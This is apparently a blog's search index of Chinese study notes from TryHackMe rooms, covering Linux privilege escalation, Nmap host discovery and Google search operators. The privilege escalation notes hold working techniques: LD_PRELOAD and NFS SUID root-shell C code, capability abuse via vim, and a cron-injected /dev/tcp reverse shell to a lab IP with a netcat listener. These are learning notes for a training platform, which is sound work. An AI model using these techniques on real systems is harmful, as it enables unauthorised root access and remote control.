<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TryHackMe-LinuxPrivilegeEscalation</title>
      <link href="/2025/04/21/TryHackMe-LinuxPrivilegeEscalation/"/>
      <url>/2025/04/21/TryHackMe-LinuxPrivilegeEscalation/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点记录"><a href="#知识点记录" class="headerlink" title="知识点记录"></a>知识点记录</h1><p>&emsp;&emsp;此文用于记录学习 TryHackMe 网站中 Room:Linux Privilege Escalation 获得的知识点。ƪ(˘⌣˘)ʃ</p><span id="more"></span><!-- toc --><h2 id="权限提升概述"><a href="#权限提升概述" class="headerlink" title="权限提升概述"></a>权限提升概述</h2><p>&emsp;&emsp;权限提升即通过系统或应用程序中的漏洞，从较低权限的帐户转到较高权限的帐户</p><h2 id="通过内核漏洞提升权限"><a href="#通过内核漏洞提升权限" class="headerlink" title="通过内核漏洞提升权限"></a>通过内核漏洞提升权限</h2><p>&emsp;&emsp;<code>内核漏洞利用方法</code>：在确定当前 Linux 的的内核版本后，可以通过搜索并查找目标系统内核版本的漏洞利用代码，利用某些可行漏洞</p><p>&emsp;&emsp;<code>如何搜索现有漏洞利用代码</code>：Google 搜索；<a href="https://www.cvedetails.com/">CVEdetails.com</a>；Exploit-db 搜索；searchsploit 搜索</p><p>&emsp;&emsp;以下是做题时学到的知识点</p><p>&emsp;&emsp;<code>Linux主机之间传送文件</code>：发送方使用命令<code>python -m http.server</code>，开放端口；接收方使用<code>wget</code>指令进行下载：<code>wget http://&lt;ip of sender&gt;:8000/&lt;filename&gt;</code></p><p>&emsp;&emsp;<code>CVE-2015-1328漏洞</code>：需求 Ubuntu 内核版本 3.13 至 3.19.0-21.21；影响的 Ubuntu 版本包括 Ubuntu 12.04&#x2F;14.04&#x2F;14.10&#x2F;15.04；可实现本地非特权用户获得 root 权限，公开的漏洞利用代码在此ƪ(˘⌣˘)ʃ   &#x3D;&gt;  <a href="https://www.exploit-db.com/exploits/37292">CVE-2015-1328漏洞利用代码</a></p><h2 id="通过设置LD-PRELOAD-生成具有root权限的shell"><a href="#通过设置LD-PRELOAD-生成具有root权限的shell" class="headerlink" title="通过设置LD_PRELOAD 生成具有root权限的shell"></a>通过设置LD_PRELOAD 生成具有root权限的shell</h2><p>&emsp;&emsp;<code>前提条件</code>：非特权用户在一些程序上拥有 sudo 权限，可以以 root 权限运行该程序；sudo 权限配置允许保留 <code>LD_PRELOAD</code> 环境变量，即<code>/etc/sudoers</code> 文件中包含如下配置：<code>Defaults env_keep += LD_PRELOAD</code>；Linux 安装了 gcc，使得其可以编译并运行 C 程序</p><p>&emsp;&emsp;<code>具体步骤</code></p><p>&emsp;&emsp;第一步，我们需要编写如下的 C 代码，这些代码的作用是使得进程在获取 uid 时返回 0，即 root 用户的 uid，实现提权(这里我准备了两段，第二段使用时需要在 shell.c 目录下)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一段</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第二段</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uid_t</span> <span class="title function_">getuid</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;第二步，使用 gcc 将 shell.c 编译为共享库，指令为<code>gcc -fPIC -shared -o shell.so shell.c [-nostartfiles]</code></p><p>&emsp;&emsp;最后，使用<code>sudo LD_PRELOAD=./shell.so &lt;命令&gt;</code>，基于此技术可以使用的命令能够通过<code>sudo -l</code>得知</p><h2 id="利用SUID文件进行权限提升"><a href="#利用SUID文件进行权限提升" class="headerlink" title="利用SUID文件进行权限提升"></a>利用SUID文件进行权限提升</h2><p>&emsp;&emsp;<code>SUID</code>：SUID 是一种特殊的文件权限设置，允许普通用户以文件所有者(也可以使用 SGID，文件所有者所在组)的身份执行该文件；如果某个可执行文件设置了 SUID 位，并且该文件的所有者是 root 用户，那么普通用户在执行该文件时，将以 root 权限运行该程序</p><p>&emsp;&emsp;<code>具体步骤</code></p><p>&emsp;&emsp;第一步，通过命令<code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code>找出所有被设置了 SUID 的可执行文件，观察是否有可以利用的命令</p><p>&emsp;&emsp;第二步，根据可以使用的命令，查看<code>/etc/shadow</code>和<code>/etc/passwd</code>，根据可以执行的指令，选择破解某账户的密码或新增 root 权限用户</p><p>&emsp;&emsp;<code>习题知识点</code>：如果 Linux 主机为<code>base64</code>指令设置了 SUID，则可基于此查看<code>/etc/shadow</code>和<code>/etc/passwd</code>并通过 base64 解码得到所有用户的账号及密码</p><h2 id="利用Capabilities属性进行权限提升"><a href="#利用Capabilities属性进行权限提升" class="headerlink" title="利用Capabilities属性进行权限提升"></a>利用Capabilities属性进行权限提升</h2><p>&emsp;&emsp;<code>Capabilities属性</code>：为特定二进制文件赋予的属性，在不给予非特权用户 sudo 权利的同时满足其使用该文件进行 root 权限才能办到的事</p><p>&emsp;&emsp;<code>具体步骤</code></p><p>&emsp;&emsp;第一步，使用命令筛选出被设置了 Capabilities 属性的文件：<code>getcap -r / 2&gt;/dev/null</code></p><p>&emsp;&emsp;根据结果，查找提权点，并编写相应代码(可使用<a href="https://gtfobins.github.io/">GTFObins</a>辅助)使用户获取 root 权限，比如下例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span></span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/home/karen/vim = cap_setuid+ep</span><br><span class="line">/home/ubuntu/view = cap_setuid+ep</span><br><span class="line"></span><br><span class="line">=&gt; 观察到vim指令存在setuid操作有设置Capabilities，利用此，可以编写代码，使本用户 uid=0 &lt;=&gt; root</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim -c <span class="string">&#x27;:!sh&#x27;</span></span></span><br><span class="line"></span><br><span class="line">=&gt; 这会打开一个root shell，接下来就可以为所欲为了</span><br></pre></td></tr></table></figure><h2 id="修改root定时任务进行权限提升"><a href="#修改root定时任务进行权限提升" class="headerlink" title="修改root定时任务进行权限提升"></a>修改root定时任务进行权限提升</h2><p>&emsp;&emsp;<code>Cron Jobs</code>：是一种定时执行的可执行文件，默认运行权限同其任务设定的所有者相同；所有的这类可执行文件的配置被存于<code>/etc/crontab</code>文件中，该文件可被所有人读取</p><p>&emsp;&emsp;<code>具体流程</code></p><p>&emsp;&emsp;第一步，使用可以使用的查看命令，查看<code>/etc/crontab</code></p><p>&emsp;&emsp;第二步，找到可以利用的提权点；比如，由 root 用户设置的，定时执行某可执行文件的指令，而目标文件可被非特权用户改写或被删除</p><p>&emsp;&emsp;最后，基于上述条件，对指定的文件进行改写，比如通过使用如下 shell，可实现攻击机对受害机以 root 权限实施的操控</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 受害机</span><br><span class="line">echo &#x27;#!/bin/bash&#x27; &gt; /home/karen/backup.sh</span><br><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1&#x27; &gt;&gt; /home/karen/backup.sh</span><br><span class="line">chmod +x /home/karen/backup.sh</span><br><span class="line"></span><br><span class="line">=&gt; 攻击机</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><h2 id="利用PATH环境变量进行权限提升"><a href="#利用PATH环境变量进行权限提升" class="headerlink" title="利用PATH环境变量进行权限提升"></a>利用PATH环境变量进行权限提升</h2><p>&emsp;&emsp;<code>PATH</code>：Linux中的环境变量设置，对于未内置于 shell 中或未使用绝对路径定义的任何命令，Linux 将在 PATH 下定义的文件夹中进行搜索</p><p>&emsp;&emsp;<code>具体步骤</code>：如下表依次进行</p><table><thead><tr><th>步骤</th><th>描述</th></tr></thead><tbody><tr><td>查找可写目录</td><td>&#96;find &#x2F; -type d -writable 2&gt;&#x2F;dev&#x2F;null</td></tr><tr><td>检查 PATH</td><td><code>echo $PATH</code></td></tr><tr><td>添加可控目录到 PATH</td><td><code>export PATH=/tmp:$PATH</code></td></tr><tr><td>放置恶意二进制</td><td><code>/tmp/thm</code></td></tr><tr><td>执行目标脚本或程序</td><td>执行含未使用绝对路径调用命令的 SUID 程序</td></tr><tr><td>提权成功</td><td>获取 root shell 或读取敏感文件</td></tr></tbody></table><h2 id="利用NFS进行权限提升"><a href="#利用NFS进行权限提升" class="headerlink" title="利用NFS进行权限提升"></a>利用NFS进行权限提升</h2><p>&emsp;&emsp;<code>NFS</code>：是一种网络文件系统协议，允许用户通过网络访问远程主机上的文件，其配置保存于<code>/etc/exports</code>文件中</p><p>&emsp;&emsp;<code>NFS的工作原理</code>：对服务器端，需配置并导出某个目录供客户端挂载；对客户端，将远程目录挂载到客户端某个目录，然后就可以像访问本地文件一样访问远程数据</p><p>&emsp;&emsp;<code>NFS配置记录解读</code>：以下直接使用 ChatGPT 4o 给出的回复，<code>&lt;共享目录路径&gt; &lt;允许IP&gt;(&lt;选项1&gt;,&lt;选项2&gt;,...)</code></p><h4 id="📌-客户端标识方式（前缀部分）"><a href="#📌-客户端标识方式（前缀部分）" class="headerlink" title="📌 客户端标识方式（前缀部分）"></a>📌 客户端标识方式（前缀部分）</h4><p>&emsp;&emsp;你可以指定哪些客户端有权限访问，比如：</p><table><thead><tr><th>客户端标识</th><th>含义</th></tr></thead><tbody><tr><td><code>*</code></td><td>所有主机（不安全）</td></tr><tr><td><code>192.168.1.100</code></td><td>指定某个 IP</td></tr><tr><td><code>192.168.1.0/24</code></td><td>指定一个子网</td></tr><tr><td><code>client.example.com</code></td><td>通过主机名识别</td></tr></tbody></table><hr><h4 id="🧩-常用选项说明（括号内的部分）"><a href="#🧩-常用选项说明（括号内的部分）" class="headerlink" title="🧩 常用选项说明（括号内的部分）"></a>🧩 常用选项说明（括号内的部分）</h4><h5 id="📖-读写权限控制"><a href="#📖-读写权限控制" class="headerlink" title="📖 读写权限控制"></a>📖 读写权限控制</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>ro</code></td><td>只读权限（Read Only）</td></tr><tr><td><code>rw</code></td><td>读写权限（Read and Write）</td></tr></tbody></table><blockquote><p>🚨 通常为了安全，建议尽量使用 <code>ro</code>，除非真的需要写权限。</p></blockquote><hr><h5 id="🧍-用户权限映射（身份映射）"><a href="#🧍-用户权限映射（身份映射）" class="headerlink" title="🧍 用户权限映射（身份映射）"></a>🧍 用户权限映射（身份映射）</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>root_squash</code></td><td>把客户端的 root 映射为低权限用户（默认行为）</td></tr><tr><td><code>no_root_squash</code></td><td>客户端的 root 保持 root 身份（⚠️ 极高危）</td></tr><tr><td><code>all_squash</code></td><td>把<strong>所有用户</strong>都映射成匿名用户（适合匿名只读共享）</td></tr><tr><td><code>anonuid=UID</code></td><td>设置匿名用户的 UID（配合 squash）</td></tr><tr><td><code>anongid=GID</code></td><td>设置匿名用户的 GID</td></tr></tbody></table><blockquote><p>✅ <code>root_squash</code> 是默认也是推荐的，<code>no_root_squash</code> 是危险操作，应避免使用。</p></blockquote><hr><h5 id="💾-同步与性能选项"><a href="#💾-同步与性能选项" class="headerlink" title="💾 同步与性能选项"></a>💾 同步与性能选项</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>sync</code></td><td>所有数据操作同步写入磁盘后才响应，数据更安全（推荐）</td></tr><tr><td><code>async</code></td><td>提前响应写入请求，性能更好但数据可能丢失（不推荐）</td></tr></tbody></table><hr><h5 id="📁-子目录检查"><a href="#📁-子目录检查" class="headerlink" title="📁 子目录检查"></a>📁 子目录检查</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>subtree_check</code></td><td>检查子目录权限是否符合导出要求（默认，稍慢）</td></tr><tr><td><code>no_subtree_check</code></td><td>不做子目录权限检查（性能更好，推荐）</td></tr></tbody></table><hr><h5 id="💡-其他高级选项（可选）"><a href="#💡-其他高级选项（可选）" class="headerlink" title="💡 其他高级选项（可选）"></a>💡 其他高级选项（可选）</h5><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td><code>insecure</code></td><td>允许客户端使用 1024 以上的非特权端口连接（不推荐）</td></tr><tr><td><code>secure</code></td><td>只接受客户端从特权端口发起的请求（默认）</td></tr><tr><td><code>nohide</code></td><td>允许客户端查看挂载在共享目录下的其他文件系统</td></tr><tr><td><code>crossmnt</code></td><td>允许跨挂载点共享子目录</td></tr><tr><td><code>fsid=0</code> 或 <code>fsid=root</code></td><td>指定 NFSv4 的“根目录”，必须设置一个共享目录为根</td></tr></tbody></table><p>&emsp;&emsp;<code>提权点所在</code>：NFS 默认会启用属性<code>root_squash</code>，把客户端上的 root 用户映射成一个低权限用户（通常是 <code>nfsnobody</code>），从而避免远程 root 用户在 NFS 服务器上获得特权</p><p>&emsp;&emsp;<code>具体步骤</code></p><p>&emsp;&emsp;第一步，在攻击机上查看目的机中可以挂载的共享文件夹，使用指令<code>showmount -e 目的机IP</code></p><p>&emsp;&emsp;第二步，在目的机中使用非特权用户读取<code>/etc/exports</code>，重点查看其中设置 no_root_squash 的文件夹</p><p>&emsp;&emsp;第三步，将选定的文件夹挂载到攻击机，使用指令<code>mount -o rw 目的机IP:所选文件夹路径 攻击机挂载路径</code></p><p>&emsp;&emsp;第四步，在攻击机挂载路径下创建脚本，内容可如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nfs.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;编译后，为该文件设置 SUID 属性，随后运行即可获取目的机 root 权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc nfs.c -0 nfs -w</span><br><span class="line">chmod  +s nfs</span><br><span class="line"></span><br><span class="line">=&gt; 目的机进行</span><br><span class="line">./nfs</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TryHackMe Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TryHackMe-NmapLiveHostDiscovery</title>
      <link href="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/"/>
      <url>/2025/04/20/TryHackMe-NmapLiveHostDiscovery/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点记录"><a href="#知识点记录" class="headerlink" title="知识点记录"></a>知识点记录</h1><p>&emsp;&emsp;此文用于记录学习 TryHackMe 网站中 Room:Nmap Live Host Discovery 获得的知识点。</p><span id="more"></span><!-- toc --><h2 id="网段、子网与子网掩码"><a href="#网段、子网与子网掩码" class="headerlink" title="网段、子网与子网掩码"></a>网段、子网与子网掩码</h2><p>&emsp;&emsp;<code>网段</code>：一个网段由一个网络地址和一个子网掩码组成；网段的主要作用是将IP地址空间划分成多个小块，分配给多个链接同一路由的主机；网段将其管理的多个主机打包，以便他们在网络中作为一个整体进行管理，以下是网段的分类</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/%E7%BD%91%E6%AE%B5%E5%88%86%E7%B1%BB.png" title="网段分类"></p><p>&emsp;&emsp;<code>子网</code>：子网是对网段的细分，如果是做一次类比，网段就好比电脑的 1TB 存储空间，而子网就等同于对这一大块硬盘分为 C&#x2F;D&#x2F;E 区</p><p>&emsp;&emsp;<code>子网掩码</code>：子网掩码通过和精确的 IP 作用，找到其链接的网段或子网，其工作原理及示例展示如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 比如我现在拥有C类网段 192.168.1.0 =&gt; 共可管理256个IP</span><br><span class="line">1、不使用子网划分，即子网为网段本事：192.168.1.0/24</span><br><span class="line">   /x：该子网的子网掩码为 111……11(x位)000……00(32-x)</span><br><span class="line">2、使用子网划分，比如分为：192.168.1.0/25、192.168.1.128/25</span><br><span class="line">   192.168.1.0/25 =&gt; 192.168.1.0~192.168.1.127</span><br><span class="line">   192.168.1.128/25 =&gt; 192.168.1.128~192.168.1.255</span><br><span class="line"># 子网掩码的工作原理：子网掩码与IP地址进行按位“与”运算，得到子网地址</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;显然，越大的网段，比如 10.1.0.0 这类，其可分配的 IP 也更多(10.1.0.0~10.1.255.255)，此时子网可写为 10.1.0.0&#x2F;16</p><h2 id="ARP查询"><a href="#ARP查询" class="headerlink" title="ARP查询"></a>ARP查询</h2><p>&emsp;&emsp;<code>ARP简介</code>：又称“地址解析协议”，利用该协议，可以获取同一子网主机的硬件地址(MAC)；需注意的是，<font color="red">ARP查询数据包仅会在链接同一交换机(数据链路层设备)的主机中通信，并不能被路由，无法跨越至其他网络</font></p><p>&emsp;&emsp;<code>MAC地址</code>：MAC 地址用于局域网内设备之间的通信。当一个设备想要与另一个设备通信时，它会使用目标设备的 MAC 地址来标识目标；它是一个唯一的标识符，通常与网卡绑定，每个网络设备在出厂时都会被分配一个唯一的 MAC 地址</p><p>&emsp;&emsp;<code>ARP查询流程</code>：ARP 查询的流程如下，假设使用主机 computer_A，交换机 Switch 记录的 MAC 地址表如下</p><table><thead><tr><th align="center">主机名</th><th align="center">MAC地址</th></tr></thead><tbody><tr><td align="center">computer_A</td><td align="center">00:14:22:01:23:45</td></tr><tr><td align="center">computer_B</td><td align="center">00:14:22:01:23:46</td></tr><tr><td align="center">computer_C</td><td align="center">00:14:22:01:23:47</td></tr><tr><td align="center">computer_D</td><td align="center">00:14:22:01:23:48</td></tr></tbody></table><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/ARP%E6%9F%A5%E8%AF%A2%E6%B5%81%E7%A8%8B.png" title="ARP查询流程"></p><h2 id="Nmap扫描指定"><a href="#Nmap扫描指定" class="headerlink" title="Nmap扫描指定"></a>Nmap扫描指定</h2><p>&emsp;&emsp;<code>指定扫描IP的四种方式</code>：列表、范围、子网和文件，展示如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list：MACHINE_IP scanme.nmap.org example.com  =&gt;  扫描3个IP</span><br><span class="line">range：10.11.12.15-20  =&gt;  扫描6个IP</span><br><span class="line">subnet：MACHINE_IP/30  =&gt;  扫描4个IP</span><br><span class="line">file：将扫描的IP以列表形式存储为.txt文件，需使用 nmap -iL filename</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>附加项的作用</code>：列举提到的两项如下</p><table><thead><tr><th align="center">附件选项</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><code>nmap -sL 扫描IP</code></td><td align="center">输出将扫描的主机的详细列表</td></tr><tr><td align="center"><code>nmap -n 扫描IP</code></td><td align="center">不对 IP 进行反向 DNS 解析，这导致无法通过 IP 获得主机名</td></tr></tbody></table><h2 id="TCP-IP层协议解析"><a href="#TCP-IP层协议解析" class="headerlink" title="TCP&#x2F;IP层协议解析"></a>TCP&#x2F;IP层协议解析</h2><p>&emsp;&emsp;一图流如下</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/TCP-IP%E5%B1%82.png" title="TCP-IP层"></p><p>&emsp;&emsp;<code>扫描所需协议</code>：ARP，同一子网下存活主机扫描；ICMP，进行 ping 操作(可跨越路由操作)；TCP&#x2F;UDP，将特制的数据包发送到常见的 TCP 或 UDP 端口，以检查目标是否会响应</p><h2 id="使用ARP进行Nmap扫描"><a href="#使用ARP进行Nmap扫描" class="headerlink" title="使用ARP进行Nmap扫描"></a>使用ARP进行Nmap扫描</h2><p>&emsp;&emsp;<code>使用条件</code>：可使用 sudo 指令，目标与本机处于同一子网中，无需目标在线</p><p>&emsp;&emsp;<code>使用语法</code>：sudo nmap -PR -sn MACHINE_IP&#x2F;24</p><p>&emsp;&emsp;<code>示例扫描结果</code>：如下图所示</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/%E7%A4%BA%E4%BE%8B%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" title="示例扫描结果"></p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/ARP%E6%89%AB%E6%8F%8F.png" title="ARP扫描"></p><p>&emsp;&emsp;<code>一个专用ARP查询的扫描器</code>：称<code>arp-scan</code>，使用指令<code>apt install arp-scan</code>下载，一般使用<code>arp-scan -l</code>，即扫描本地子网上所有有效 IP</p><h2 id="使用ICMP进行Nmap扫描"><a href="#使用ICMP进行Nmap扫描" class="headerlink" title="使用ICMP进行Nmap扫描"></a>使用ICMP进行Nmap扫描</h2><p>&emsp;&emsp;<code>使用条件</code>：可使用 sudo 指令，需目标在线，即需目标对 ping 请求进行回复</p><p>&emsp;&emsp;<code>使用语法</code>：sudo nmap -PE&#x2F;-PP&#x2F;-PM -sn 扫描IP，<code>-sn</code>表示无需扫描端口</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/ICMP%E6%89%AB%E6%8F%8F.png" title="ICMP扫描"></p><h2 id="使用TCP和UDP进行Nmap扫描"><a href="#使用TCP和UDP进行Nmap扫描" class="headerlink" title="使用TCP和UDP进行Nmap扫描"></a>使用TCP和UDP进行Nmap扫描</h2><p>&emsp;&emsp;<code>使用语法</code>：sudo nmap -PS&#x2F;-PA&#x2F;PU[端口号] -sn 扫描IP，端口号默认为 80 端口</p><p><img src="/2025/04/20/TryHackMe-NmapLiveHostDiscovery/TCP%E6%89%AB%E6%8F%8F.png" title="TCP扫描"></p><p>&emsp;&emsp;<code>一个专用TCP/UDP查询的扫描器</code>：称<code>masscan</code>，使用指令<code>apt install masscan</code>下载，使用语法<code>masscan 扫描网段 -p端口</code></p><h2 id="总结-当搬运工了"><a href="#总结-当搬运工了" class="headerlink" title="总结(当搬运工了)"></a>总结(当搬运工了)</h2><table><thead><tr><th align="center">扫描类型</th><th align="center">示例命令</th></tr></thead><tbody><tr><td align="center">ARP Scan ARP （ARP）扫描</td><td align="center"><code>sudo nmap -PR -sn MACHINE_IP/24</code></td></tr><tr><td align="center">ICMP Echo Scan ICMP 回声扫描</td><td align="center"><code>sudo nmap -PE -sn MACHINE_IP/24</code></td></tr><tr><td align="center">ICMP Timestamp Scan ICMP 时间戳扫描</td><td align="center"><code>sudo nmap -PP -sn MACHINE_IP/24</code></td></tr><tr><td align="center">ICMP Address Mask Scan ICMP 地址掩码扫描</td><td align="center"><code>sudo nmap -PM -sn MACHINE_IP/24</code></td></tr><tr><td align="center">TCP SYN Ping Scan TCP 协议 SYN Ping 扫描</td><td align="center"><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td align="center">TCP ACK Ping Scan TCP 协议 ACK Ping 扫描</td><td align="center"><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td align="center">UDP Ping Scan UDP 协议 Ping 扫描</td><td align="center"><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td></tr></tbody></table><table><thead><tr><th align="center">选择</th><th align="center">目的</th></tr></thead><tbody><tr><td align="center"><code>-n</code></td><td align="center">无 DNS 查找</td></tr><tr><td align="center"><code>-R</code></td><td align="center">所有主机的反向 DNS 查找</td></tr><tr><td align="center"><code>-sn</code></td><td align="center">仅主机发现</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TryHackMe Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TryHackMe-杂项</title>
      <link href="/2025/04/19/TryHackMe-%E6%9D%82%E9%A1%B9/"/>
      <url>/2025/04/19/TryHackMe-%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点记录"><a href="#知识点记录" class="headerlink" title="知识点记录"></a>知识点记录</h1><p>&emsp;&emsp;此文用于记录学习 TryHackMe 网站中，一些细碎而有用的知识点。</p><span id="more"></span><!-- toc --><h2 id="Search-Skills"><a href="#Search-Skills" class="headerlink" title="Search Skills"></a>Search Skills</h2><p>&emsp;&emsp;<code>Google支持的搜索运算符</code>：以下展示四个常用搜索运算符的作用并提供一定示例</p><table><thead><tr><th align="center">搜索运算符</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><code>&quot;exact phrase&quot;</code></td><td align="center">返回包含确切单词或短语的页面</td></tr><tr><td align="center"><code>site:</code></td><td align="center">指定要将搜索限制到的域名</td></tr><tr><td align="center"><code>-</code></td><td align="center">省略包含特定单词或短语的搜索结果</td></tr><tr><td align="center"><code>filetype:</code></td><td align="center">查找指定类型的文件</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># “exact phrase”</span></span><br><span class="line">|“civil procedural law”|  =&gt;  返回包含该短语的网页</span><br><span class="line"><span class="comment"># site:</span></span><br><span class="line">|site:gov.cn sichuan|  =&gt;  返回域名为 gov.cn 且同四川相联系的网页</span><br><span class="line"><span class="comment"># -</span></span><br><span class="line">|-dafabet soccer|  =&gt;  返回有关足球而不包含足球博彩的网页</span><br><span class="line"><span class="comment"># filetype</span></span><br><span class="line">|filetype:pdf report|  =&gt;  返回文件类型为 PDF 的报告</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TryHackMe Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-Web笔记1-50</title>
      <link href="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/"/>
      <url>/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/</url>
      
